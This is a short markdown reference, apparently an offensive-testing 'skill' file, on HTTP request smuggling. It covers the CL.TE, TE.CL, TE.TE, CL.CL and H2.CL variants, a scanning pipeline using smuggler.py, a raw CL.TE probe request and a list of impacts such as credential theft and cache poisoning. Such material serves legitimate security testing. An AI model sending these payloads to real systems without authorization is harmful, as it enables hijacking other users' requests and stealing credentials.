# HTTP Request Smuggling Hunting Skill

## Types
| Type | Description |
|------|-------------|
| CL.TE | Content-Length parsed by front-end, Transfer-Encoding by back-end |
| TE.CL | Transfer-Encoding parsed by front-end, Content-Length by back-end |
| TE.TE | Both parse Transfer-Encoding but disagree on implementation |
| CL.CL | Duplicate Content-Length headers |
| H2.CL | HTTP/2 to HTTP/1.1 downgrading smuggling |

## Detection
```bash
cat alive.txt | python3 smuggler.py | tee smuggler_results.txt
```

## Manual Detection
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If front-end processes CL (6 bytes → "0\r\n\r\n") and back-end processes TE ("0" → end), the "G" is prepended to the next request.

## H2.CL (HTTP/2)
```
# Send HTTP/2 request with:
# - :method POST
# - :path /
# - content-length: 6 (CL) but body is "0\r\n\r\nG"
# Back-end converts to HTTP/1.1 with the smuggled prefix
```

## Impact
- Request smuggling → credential theft (other users' requests)
- Cache poisoning
- XSS injection into other users' requests
- WAF bypass
- Route manipulation
